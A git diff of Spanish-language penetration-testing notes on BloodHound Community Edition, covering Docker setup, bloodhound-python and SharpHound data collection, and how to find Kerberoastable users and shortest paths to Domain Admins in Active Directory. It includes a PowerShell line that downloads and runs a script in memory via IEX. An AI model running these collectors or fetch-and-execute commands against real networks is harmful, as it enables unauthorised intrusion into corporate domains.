@@ -1,4 +1,4 @@
-# Bloodhound 
+# Bloodhound Community NEW VERSION
 
 Tags: #AD #BloodHound #SharpHound #Kali #Parrot 
 
@@ -52,38 +52,48 @@ Los 'ActiveDirectoryRights' incluyen, pero no se limitan a:
 8. GetChangesAll: Es un permiso en Active Directory que permite replicar todos los datos, incluso contraseñas; es clave para ataques como 'DCSync'.
 ```
 
-## BloodHound 
+## BloodHound Community
 
-* [CustomQueries.json - BloodHound](https://github.com/CompassSecurity/BloodHoundQueries/tree/master/BloodHound_Custom_Queries)
-* [Bloodhound](https://www.kali.org/tools/bloodhound/)
+* [Bloodhound-Community-Install](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)
 
-```bash 
-❯ bloodhound-setup           # Iniciar el neo4j 'http:localhost:7474'   
-❯ BloodHound --no-sandbox    # Ejecutar Bloodhound y se abre en la web 'http://localhost:8080/ui/login'
+```powershell
+❯ sudo docker-compose -f docker-compose.yml up -d   # Iniciar BloodHound con Docker despues de reiniciar Kali
+❯ sudo docker-compose -f docker-compose.yml down    # Apagar BloodHound 
+
+❯ http://127.0.0.1:8080/ui/login         # Ingresar a BloodHound Community por la web               
 
 Notas: 
-	1. Si es la primera vez que se usa, abrir la web 'localhost:7474', agregar las credenciales 'neo4j:neo4j' y conectarse a la web 'Bloodhound' para agregar las nuevas credenciales 'admin:admin'
-	2. El 'CustomQueries.json' se descarga y se copia en la carpeta donde esta instalado 'BloodHound'
+	1. Si es la primera vez que sehace mirar el enlace de instalación y seguir las instrucciones  
+	2. La instalción es por Docker por lo que al iniciar el sistema se debe de volver a iniciar 'BloodHound'
 ```
 
-```bash 
-Enumerar lo siguiente en BloodHound en 'Analysis':
+```bash  
+Enumerar lo siguiente en BloodHound:
 
 	1. Identificación de 'Doman Admins'
 	2. Identificación de 'usuarios Kerberoasteables'
 	3. Identificación de 'usuarios AS-REP Roastable'
 	4. Identificación de vectores de ataque 'Find Shortest Paths to Domain Admins'
 	5. Identificación de 'Unsconstrained Delegation'
-	6. Identificación de usuarios con permisos sobre GPO 'Find if any domain user has interesting against aGPO'
+
+Una vez obtenido un usuario:
+1. Agregar la opción 'Mark User as Owned'
+	1. Seleccionar el usuario y dar click en 'Outbound Object Control' para ver los derechos que tiene el usuario (Puede tener derechos sobre otros usuarios)
+
+2. Utilizar 'CYPHER'
+	1. En 'Shortest Path' seleccionar 'Shortest Path to Domain Admins' y finalizar con 'Run' para ejecutarlo
 ```
 
-```bash 
-Una vez obtenido un usuario:
+## BloodHound-Python Recolector
 
-# Manera 1
-1. Agregar la opción 'Mark User as Owned'
-	1. Seleccionar la opción 'Reachable High Value Targets' para ver el camino y lo que deberiamos de hacer para ser usuario 'Administrator' en 'Overview'
-	2. Seleccionar 'First Degree Object Control' en 'Outbound control rights' para ver si el usuario contempla alguna acción 
+```bash
+# Recolectar data con credenciales validas 
+❯ bloodhound-python -u 'user' -p 'passwd' -c All --zip -ns IP_DC -d domain.corp 
+
+Notas: 
+	1. Sincronizar el reloj con el DC 
+		❯ ntpdate IP
+	2. Importar todos los archivos en formato 'Json' a BloodHound
 ```
 
 ## SharpHound 
@@ -101,12 +111,7 @@ Una vez obtenido un usuario:
 # Importar el modulo en memoria
 ❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/SharpHound.ps1') 
 
-❯ Invoke-BloodHound -CollectionMethod All     
-
-
-Notas: 
-	1. Si se ha instalado 'BloodHound' con 'apt' se debe de usar 'SharpHound.exe' que se encuentra en la ruta de instalacion del BloodHound para que se puedan cargar los datos 
-	2. Recolectar la información en la maquina victima Windows y obtener un archivo '.zip' para agregarlo a 'BloodHound'
+❯ Invoke-BloodHound -CollectionMethod All      # Recolectar la data 
 ```
 
 ## ADPeas 
@@ -122,16 +127,7 @@ Notas:
 	1. Al usar ADPeas para hacer la recolección ejecuta 'SharpHound' automaticamente
 ```
 
-## Subir Data por Python a BloodHound
-
-```bash
-❯ bloodhound-python -d Domain.local -u User -p Password -ns IP_DC -c all   # Ejecutamos para recopilar la data y asi poder subir el archivo a la plataforma de Bloodhound
-
-Notas: 
-	1. Importamos todos los archivos que fueron generados en formato 'Json'
-```
-
-## SharpHound con credenciales Validas desde un CMD en Windows 
+## SharpHound desde un CMD en Windows 
 
 ```bash 
 # Autenticarse en un 'CMD' en Windows con credenciales validas
